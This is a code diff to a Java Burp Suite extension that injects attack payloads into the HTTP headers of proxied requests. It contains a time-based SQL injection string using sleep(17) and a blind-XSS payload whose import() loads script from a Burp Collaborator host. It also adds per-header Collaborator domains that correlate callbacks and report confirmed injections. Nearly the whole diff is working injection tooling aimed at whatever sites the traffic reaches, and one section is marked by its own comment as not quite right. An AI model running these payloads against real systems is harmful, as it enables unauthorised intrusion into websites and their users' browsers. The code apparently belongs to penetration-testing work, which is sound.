@@ -4,6 +4,9 @@ import burp.api.montoya.BurpExtension;
 import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.collaborator.CollaboratorClient;
 import burp.api.montoya.collaborator.CollaboratorPayload;
+import burp.api.montoya.collaborator.CollaboratorServer;
+import burp.api.montoya.collaborator.DnsDetails;
+import burp.api.montoya.collaborator.HttpDetails;
 import burp.api.montoya.collaborator.Interaction;
 import burp.api.montoya.core.ByteArray;
 import burp.api.montoya.core.ToolType;
@@ -64,6 +67,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private PersistedObject persistedObject;
     private CollaboratorClient collaboratorClient;
     private ScheduledExecutorService scheduler;
+    private String collaboratorServerLocation;
     
     // Settings
     private boolean extensionActive = true;
@@ -75,7 +79,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private List<String> headers = new ArrayList<>();
     private List<String> sensitiveHeaders = new ArrayList<>();
     private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
-    private String bxssPayload = "";
+    private String bxssPayload = "Mozilla\"><img/src/onerror=import('//collaborator.oastify.com')>"; // Generic template
     private List<String> skipHosts = new ArrayList<>();
     private List<String> injectedHeaders = new ArrayList<>();
     private List<String> extraHeaders = new ArrayList<>();
@@ -86,6 +90,21 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     
     // Request timing tracking
     private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
+    
+    // Payload correlation tracking
+    private final Map<String, PayloadContext> payloadMap = new ConcurrentHashMap<>();
+
+    private static class PayloadContext {
+        final HttpRequest originalRequest;
+        final String headerName;
+        final long timestamp;
+
+        PayloadContext(HttpRequest originalRequest, String headerName) {
+            this.originalRequest = originalRequest;
+            this.headerName = headerName;
+            this.timestamp = System.currentTimeMillis();
+        }
+    }
     
     // Default headers
     private static final List<String> DEFAULT_HEADERS = Arrays.asList(
@@ -117,6 +136,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
         this.api = api;
         this.persistedObject = api.persistence().extensionData();
         this.collaboratorClient = api.collaborator().createClient();
+        this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
         this.scheduler = Executors.newScheduledThreadPool(2);
         
         // Set extension name
@@ -126,7 +146,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
         loadSettings();
         
         // Initialize collaborator payload
-        initializeCollaboratorPayload();
+        // initializeCollaboratorPayload(); // This is no longer needed as we generate payloads on the fly
         
         // Update injected headers
         updateInjectedHeaders();
@@ -259,10 +279,8 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }
 
     private void initializeCollaboratorPayload() {
-        if (bxssPayload.isEmpty()) {
-            CollaboratorPayload payload = collaboratorClient.generatePayload();
-            bxssPayload = "Mozilla\"><img/src/onerror=import('//" + payload.toString() + "')>";
-        }
+        // This method is no longer needed as we generate payloads dynamically.
+        // It's kept here to avoid breaking old references, but it's empty.
     }
 
     public void extractSqliSleepTime() {
@@ -304,46 +322,68 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
             try {
                 List<Interaction> interactions = collaboratorClient.getAllInteractions();
                 for (Interaction interaction : interactions) {
-                    api.logging().logToOutput("🚀 SUCCESSFUL XSS DETECTED! 🚀");
-                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
-                    
-                    // Log detailed interaction information
-                    api.logging().logToOutput("📋 Interaction Details:");
-                    api.logging().logToOutput("  • ID: " + interaction.id());
-                    api.logging().logToOutput("  • Type: " + interaction.type());
-                    api.logging().logToOutput("  • Time: " + new java.util.Date());
-                    api.logging().logToOutput("  • Payload: " + bxssPayload);
-                    api.logging().logToOutput("  • Headers Used: " + getCurrentAttackHeaders());
-                    
-                    // Log basic interaction type information
-                    if (interaction.dnsDetails().isPresent()) {
-                        api.logging().logToOutput("  • Interaction Type: DNS");
+                    String interactionDomain = findDomainInInteraction(interaction);
+                    if (interactionDomain != null) {
+                        PayloadContext context = payloadMap.get(interactionDomain);
+                        if (context != null) {
+                            api.logging().logToOutput("🚀 SUCCESSFUL XSS DETECTED! 🚀");
+                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
+                            
+                            // Log detailed interaction information
+                            api.logging().logToOutput("📋 Interaction Details:");
+                            api.logging().logToOutput("  • URL: " + context.originalRequest.url());
+                            api.logging().logToOutput("  • Header: " + context.headerName);
+                            api.logging().logToOutput("  • Time: " + new java.util.Date());
+                            
+                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
+                            
+                            // Create XSS issue
+                            createXssIssue(interaction, context);
+                            
+                            // Clean up the map
+                            payloadMap.remove(interactionDomain);
+                        }
                     }
-                    
-                    if (interaction.httpDetails().isPresent()) {
-                        api.logging().logToOutput("  • Interaction Type: HTTP");
-                    }
-                    
-                    if (interaction.smtpDetails().isPresent()) {
-                        api.logging().logToOutput("  • Interaction Type: SMTP");
-                    }
-                    
-                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
-                    
-                    // Create XSS issue
-                    createXssIssue(interaction);
                 }
             } catch (Exception e) {
                 api.logging().logToError("Error polling collaborator: " + e.getMessage());
             }
         }, 30, 30, TimeUnit.SECONDS);
+
+        // Add a cleanup task for old payloads in the map
+        scheduler.scheduleWithFixedDelay(() -> {
+            long now = System.currentTimeMillis();
+            payloadMap.entrySet().removeIf(entry -> (now - entry.getValue().timestamp) > TimeUnit.MINUTES.toMillis(15));
+        }, 15, 15, TimeUnit.MINUTES);
     }
 
-    private void createXssIssue(Interaction interaction) {
+    private String findDomainInInteraction(Interaction interaction) {
+        String collaboratorHost = this.collaboratorServerLocation;
+        
+        Optional<String> domainFromHttp = interaction.httpDetails()
+                .map(http -> http.requestReceived().httpService().host());
+                
+        if (domainFromHttp.isPresent() && domainFromHttp.get().endsWith(collaboratorHost)) {
+            return domainFromHttp.get();
+        }
+        
+        Optional<String> domainFromDns = interaction.dnsDetails()
+                .map(DnsDetails::query)
+                .map(ByteArray::toString);
+                
+        if (domainFromDns.isPresent() && domainFromDns.get().endsWith("." + collaboratorHost)) {
+            String dnsQuery = domainFromDns.get();
+            return dnsQuery.substring(0, dnsQuery.length() - 1); // remove trailing dot
+        }
+
+        return null;
+    }
+
+    private void createXssIssue(Interaction interaction, PayloadContext context) {
         // Enhanced XSS issue creation with more context
         api.logging().logToOutput("💥 XSS VULNERABILITY CONFIRMED!");
-        api.logging().logToOutput("🎯 Attack Vector: Header injection via " + getCurrentAttackHeaders());
-        api.logging().logToOutput("🔍 Payload Used: " + bxssPayload);
+        api.logging().logToOutput("🎯 Attack Vector: Header injection via " + context.headerName);
+        api.logging().logToOutput("  • URL: " + context.originalRequest.url());
         api.logging().logToOutput("⚡ Impact: Cross-Site Scripting (XSS) execution detected");
         api.logging().logToOutput("🕐 Detected: " + new java.util.Date());
         api.logging().logToOutput("📊 Interaction ID: " + interaction.id());
@@ -473,12 +513,14 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     // ProxyResponseHandler implementation
     @Override
     public ProxyResponseReceivedAction handleResponseReceived(InterceptedResponse interceptedResponse) {
-        if (!extensionActive || attackMode == 2) {
+        if (!extensionActive) { // No longer checking attackMode == 2 here
             return ProxyResponseReceivedAction.continueWith(interceptedResponse);
         }
 
         // Process response for SQL injection detection
-        processResponseForSqli(interceptedResponse);
+        if (attackMode == 1) {
+            processResponseForSqli(interceptedResponse);
+        }
         
         // Launch separate scan for sensitive headers
         scheduler.execute(() -> processSensitiveHeadersScan(interceptedResponse));
@@ -492,6 +534,10 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     }
 
     private HttpRequest modifyRequestHeaders(HttpRequest request) {
+        if (attackMode == 2) {
+            return injectUniqueXssPayloads(request);
+        }
+        
         List<HttpHeader> originalHeaders = request.headers();
         List<String> headersToAdd = new ArrayList<>();
         
@@ -511,12 +557,51 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
         
         // Add modified Referer if it was present
         if (refererValue != null && headers.contains("Referer")) {
-            String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
+            String currentPayload = sqliPayload; // Only SQLi in this path now
             headersToAdd.add("Referer: " + refererValue + currentPayload);
         }
 
         List<HttpHeader> newHeaders = addOrReplaceHeaders(baseHeaders, headersToAdd);
         return request.withUpdatedHeaders(newHeaders);
+    }
+
+    private HttpRequest injectUniqueXssPayloads(HttpRequest request) {
+        List<HttpHeader> modifiedHeaders = new ArrayList<>(request.headers());
+        
+        for (String headerName : headers) {
+            CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
+            String payloadDomain = collabPayload.toString();
+
+            String finalPayload;
+            if ("User-Agent".equalsIgnoreCase(headerName)) {
+                finalPayload = bxssPayload.replace("collaborator.oastify.com", payloadDomain);
+            } else if ("Referer".equalsIgnoreCase(headerName)) {
+                String originalReferer = request.headerValue("Referer");
+                if (originalReferer == null) originalReferer = request.url();
+                finalPayload = originalReferer + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+            } else {
+                finalPayload = "1" + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+            }
+
+            // Create and store context
+            payloadMap.put(payloadDomain, new PayloadContext(request, headerName));
+
+            // Overwrite header
+            boolean headerFoundAndReplaced = false;
+            for (int i = 0; i < modifiedHeaders.size(); i++) {
+                if (modifiedHeaders.get(i).name().equalsIgnoreCase(headerName)) {
+                    modifiedHeaders.set(i, HttpHeader.httpHeader(headerName, finalPayload));
+                    headerFoundAndReplaced = true;
+                    break;
+                }
+            }
+            if (!headerFoundAndReplaced) {
+                modifiedHeaders.add(HttpHeader.httpHeader(headerName, finalPayload));
+            }
+        }
+        
+        // Add extra headers as well, without payloads
+        return request.withUpdatedHeaders(addOrReplaceHeaders(modifiedHeaders, extraHeaders));
     }
 
     private void processResponseForSqli(InterceptedResponse interceptedResponse) {
@@ -556,11 +641,34 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
             return;
         }
 
-        // Create modified request with sensitive headers
+        if (attackMode == 2) {
+            // BXSS logic for sensitive headers
+            List<HttpHeader> headersToUpdate = new ArrayList<>();
+            for (String sensitiveHeader : sensitiveHeaders) {
+                CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
+                String payloadDomain = collabPayload.toString();
+                String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                headersToUpdate.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
+                payloadMap.put(payloadDomain, new PayloadContext(originalRequest, sensitiveHeader));
+            }
+            HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(originalRequest.headers(), extraHeaders));
+            
+            // This is not quite right, need to combine headersToUpdate and extraHeaders
+            List<HttpHeader> finalHeaders = addOrReplaceHeaders(originalRequest.headers(), extraHeaders);
+            finalHeaders.addAll(headersToUpdate);
+
+
+            HttpRequest finalRequest = originalRequest.withUpdatedHeaders(finalHeaders);
+
+            api.http().sendRequest(finalRequest); // Send and forget, collaborator will catch it
+            return;
+        }
+        
+        // Create modified request with sensitive headers for SQLi
         List<String> headersToAdd = new ArrayList<>();
         
         // Add sensitive headers with payloads
-        String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
+        String currentPayload = sqliPayload;
         for (String sensitiveHeader : sensitiveHeaders) {
             headersToAdd.add(sensitiveHeader + ": " + hostValue + currentPayload);
         }
@@ -641,8 +749,28 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
                 String hostValue = getHeaderValue(originalRequest.headers(), "Host");
                 
                 if (hostValue != null) {
+                    if (attackMode == 2) {
+                        // BXSS logic for context menu
+                        List<HttpHeader> headersToUpdate = new ArrayList<>();
+                        for (String sensitiveHeader : sensitiveHeaders) {
+                            CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
+                            String payloadDomain = collabPayload.toString();
+                            String finalPayload = hostValue + bxssPayload.replace("Mozilla", "").replace("collaborator.oastify.com", payloadDomain);
+                            headersToUpdate.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
+                            payloadMap.put(payloadDomain, new PayloadContext(originalRequest, sensitiveHeader));
+                        }
+                        HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(originalRequest.headers(), extraHeaders));
+                        List<HttpHeader> finalHeaders = new ArrayList<>(modifiedRequest.headers());
+                        finalHeaders.addAll(headersToUpdate);
+                        HttpRequest finalRequest = originalRequest.withUpdatedHeaders(finalHeaders);
+                        api.http().sendRequest(finalRequest);
+                        api.logging().logToOutput("Context menu scan: Sent BXSS probes for sensitive headers for URL: " + originalRequest.url());
+                        return;
+                    }
+
+                    // SQLi logic
                     List<String> headersToAdd = new ArrayList<>();
-                    String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
+                    String currentPayload = sqliPayload;
                     
                     for (String sensitiveHeader : sensitiveHeaders) {
                         headersToAdd.add(sensitiveHeader + ": " + hostValue + currentPayload);
